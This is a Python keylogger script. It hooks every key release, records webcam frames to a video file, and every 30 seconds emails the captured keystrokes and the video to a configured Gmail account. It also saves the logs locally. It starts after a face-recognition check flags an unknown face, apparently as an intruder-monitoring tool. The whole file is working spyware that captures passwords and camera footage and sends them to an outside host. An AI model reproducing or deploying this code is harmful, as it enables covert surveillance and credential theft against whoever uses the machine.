from email import encoders
from email.mime.base import MIMEBase
import os   #   V
import cv2  #   V
from faceRecognition import faceRecognition

import keyboard  # for keylogs V
import smtplib  # for sending email using SMTP protocol (gmail)
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer #   V
from datetime import datetime   #   V
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
SEND_REPORT_EVERY = 30  # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "YOUR EMAIL ID"
EMAIL_PASSWORD = "EMAILPASSWORD"



class Keylogger:
    
    def __init__(self, interval, report_method="email"):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.filename = None
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.cap = cv2.VideoCapture(0)
        self.width = int(self.cap.get(cv2.CAP_PROP_FRAME_WIDTH) + 0.5)
        self.height = int(self.cap.get(cv2.CAP_PROP_FRAME_HEIGHT) + 0.5)
        self.size = (self.width, self.height)
        self.fourcc = cv2.VideoWriter_fourcc(*'XVID')
        self.out = cv2.VideoWriter('your_video.avi', self.fourcc, 20.0, self.size)

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured and video caputed
        (i.e when a key is released in this example)
        """
        _, frame = self.cap.read()
        # cv2.imshow('Recording...', frame)
        self.out.write(frame)
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name

    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            #write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    @staticmethod
    def prepare_mail(message):
        """Utility function to construct a MIMEMultipart from a text
        It creates an HTML version as well as text version
        to be sent as an email"""
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        # simple paragraph, feel free to edit
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        with open("your_video.avi", "rb") as fs:
            part = MIMEBase('application', "octet-stream")
            part.set_payload(fs.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment', filename=os.path.basename("your_video.avi"))
        msg.attach(part)
        # after making the mail, convert back as string message
        return msg.as_string()

    def sendmail(self, email, password, message, verbose=1):
        # manages a connection to an SMTP server
        # in our case it's for Microsoft365, Outlook, Hotmail, and live.com
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.login(email, password)
        # send the actual message after preparation
        server.sendmail(email, email, self.prepare_mail(message))
        # terminates the session
        server.quit()
        #if verbose:
            #print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            # if self.report_method == "email":
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            # elif self.report_method == "file":
            self.report_to_file()
                # if you don't want to print in the console, comment below line
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        self.out = cv2.VideoWriter('your_video.avi', self.fourcc, 20.0, self.size)
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
        #print(f"{datetime.now()} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()


if __name__ == "__main__":
    # if you want a keylogger to send to your email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want a keylogger to record keylogs to a local file
    # (and then send it using your favorite method)
    fRecognition= faceRecognition()
    isUnknown=fRecognition.isUnknow()

    if(isUnknown):
        keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
        print("You are being recorded!")
        keylogger.start()
    else:
        print("Face is known")

    
